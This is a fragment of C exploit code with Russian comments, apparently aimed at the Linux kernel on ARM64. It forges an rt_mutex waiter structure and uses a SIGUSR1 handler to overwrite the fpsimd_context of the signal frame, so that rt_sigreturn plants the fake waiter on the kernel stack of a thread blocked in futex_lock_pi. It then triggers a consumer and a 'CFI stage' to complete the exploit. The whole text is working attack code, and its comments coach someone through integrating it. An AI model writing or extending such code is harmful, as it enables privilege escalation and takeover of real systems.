#include <signal.h>
#include <asm/sigcontext.h>

static volatile int sigreturn_done = 0;
static uint8_t g_fake_waiter[0x58];

void sigreturn_handler(int sig, siginfo_t *info, void *ucontext) {
    (void)sig; (void)info;
    ucontext_t *uc = (ucontext_t*)ucontext;
    mcontext_t *mc = &uc->uc_mcontext;
    
    // Находим fpsimd_context в mcontext.__reserved
    unsigned char *base = (unsigned char*)mc;
    for (int off = 0; off < 1024; off += 8) {
        if (*(uint32_t*)(base + off) == FPSIMD_MAGIC) {
            struct fpsimd_context *fpsimd = (struct fpsimd_context*)(base + off);
            
            // Пишем fake waiter на offset 0x18 от vregs[0]
            uint8_t *vregs = (uint8_t*)&fpsimd->vregs[0];
            memcpy(vregs + 0x18, g_fake_waiter, 0x58);
            
            sigreturn_done = 1;
            return;
        }
    }
}

void do_sigreturn_fake_lock_route(void) {
    // 1. Подготовить fake waiter (те же байты, что раньше шли в fdset)
    //    Бери из своего prepare_pselect_fdsets() — те же 11 qwords
    memset(g_fake_waiter, 0, sizeof(g_fake_waiter));
    put64(g_fake_waiter, 0x10, pselect_write_value());   // tree_pc
    put64(g_fake_waiter, 0x18, 0);                        // tree_right
    put64(g_fake_waiter, 0x20, pselect_write_target());   // tree_left
    put64(g_fake_waiter, 0x28, pselect_write_value());    // pi_parent
    put64(g_fake_waiter, 0x30, 0);                        // pi_right
    put64(g_fake_waiter, 0x38, pselect_write_target());   // pi_left
    put64(g_fake_waiter, 0x40, text_addr(INIT_TASK));     // task
    put64(g_fake_waiter, 0x48, fake_lock);                // lock
    put64(g_fake_waiter, 0x50, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3); // prio
    
    // 2. Установить signal handler на victim thread
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = sigreturn_handler;
    sa.sa_flags = SA_SIGINFO | SA_RESTART;
    sigaction(SIGUSR1, &sa, NULL);
    
    // 3. Запустить GhostLock (victim thread блокируется в futex_lock_pi)
    //    У тебя это уже есть — просто используй тот же код создания waiter'а
    
    // 4. Дать victim'у время создать waiter
    usleep(50000);
    
    // 5. Послать сигнал victim thread'у
    //    waiter_tid — TID thread'а, который в futex_lock_pi
    sigreturn_done = 0;
    pthread_kill(waiter_tid, SIGUSR1);
    
    // 6. Ждать, пока handler отработает и rt_sigreturn завершится
    while (!sigreturn_done) {
        sched_yield();
    }
    
    // 7. Теперь на kernel stack лежит перезаписанный fake waiter
    //    Запускаем consumer — тот же механизм, что в pselect route
    atomic_store(&punch_consume_go, 1);
    
    // 8. Ждём результат от consumer'а
    int waited = 0;
    while (waited < 500000) {
        if (atomic_load(&consumer_calls) > 0 && atomic_load(&consumer_success) > 0) {
            // Успех! Запускаем CFI stage
            if (try_cfi_stage()) {
                route_verified = 1;
                break;
            }
        }
        usleep(1000);
        waited += 1000;
    }
    
    // 9. Cleanup
    atomic_store(&punch_consume_go, 0);
}